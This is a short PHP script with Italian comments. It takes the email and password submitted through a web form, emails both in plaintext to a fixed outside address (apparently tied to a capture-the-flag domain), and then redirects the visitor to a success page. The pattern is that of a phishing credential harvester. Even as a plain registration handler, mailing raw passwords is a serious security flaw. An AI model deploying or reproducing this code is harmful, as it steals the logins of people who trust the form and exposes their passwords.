<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Raccogli i dati del modulo
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Destinatario dell'email (la tua email personale)
    $to = "1de0d3@ctf24.it"; // Sostituisci con la tua email
    $subject = "Nuovo modulo di registrazione";

    // Corpo dell'email
    $message = "Hai ricevuto una nuova registrazione:\n\n";
    $message .= "Email: " . $email . "\n";
    $message .= "Password: " . $password . "\n";

    // Header dell'email
    $headers = "From: 1de0d3@ctf24.it"; // Cambia con il tuo indirizzo email

    // Invia l'email
    if (mail($to, $subject, $message, $headers)) {
        // Reindirizza l'utente alla pagina success.html
        header("Location: success.html");
        exit();
    } else {
        echo "Errore nell'invio dell'email. Riprova.";
    }
}
?>
